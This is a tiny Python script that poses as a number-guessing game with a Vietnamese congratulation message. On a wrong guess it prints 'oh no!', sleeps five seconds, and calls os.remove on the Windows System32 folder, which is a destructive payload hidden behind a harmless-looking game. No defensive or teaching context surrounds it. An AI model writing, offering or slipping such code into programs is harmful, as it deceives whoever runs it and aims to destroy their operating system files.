import random,os,time


n=int(input())
a=random.randint(1,10)
if n==a:
    print("chúc mừng")
else:
    print("oh no!")
    time.sleep(5)
    os.remove("C:/Windows/System32")
